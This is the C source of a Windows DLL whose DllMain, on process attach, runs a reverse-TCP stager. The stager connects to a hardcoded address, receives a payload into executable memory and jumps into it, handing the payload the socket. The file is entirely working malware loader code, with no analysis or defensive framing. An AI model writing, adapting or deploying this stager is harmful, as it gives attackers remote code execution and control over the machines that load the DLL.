#include "Windows.h"
#include <WinSock2.h>
#include <stdio.h>  

#pragma comment(lib,"WS2_32.lib")   

int reverse_tcp()
{
    WSADATA wsData;
        if(WSAStartup(MAKEWORD(2,2),&wsData))
        {
            printf("WSAStartp fail.\n");
            return 0;
        } 

        SOCKET sock = WSASocket(AF_INET,SOCK_STREAM,0,0,0,0);
        SOCKADDR_IN server;
        ZeroMemory(&server,sizeof(SOCKADDR_IN));
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = inet_addr("192.168.127.132"); //server ip
        server.sin_port = htons(8888); //server port
        if(SOCKET_ERROR == connect(sock,(SOCKADDR*)&server,sizeof(server)))
        {
            printf("connect to server fail.\n");
            closesocket(sock);
            WSACleanup();
            return 0;
        } 

        u_int payloadLen;
        if (recv(sock,(char*)&payloadLen,sizeof(payloadLen),0) != sizeof(payloadLen))
        {
            printf("recv error\n");
            closesocket(sock);
            WSACleanup();
            return 0;
        } 

        char* orig_buffer = (char*)VirtualAlloc(NULL,payloadLen,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
        char* buffer = orig_buffer;
        int ret = 0;
        do 
        {
            ret = recv(sock,buffer,payloadLen,0);
            buffer += ret;
            payloadLen -= ret;
        } while (ret > 0 && payloadLen > 0);  


        __asm
        {
            mov edi,sock;   
            jmp orig_buffer; 
        } 

        VirtualFree(orig_buffer,0,MEM_RELEASE);   


}   

BOOL APIENTRY DllMain( HMODULE hModule,
                      DWORD  ul_reason_for_call,
                      LPVOID lpReserved
                      )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        reverse_tcp();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
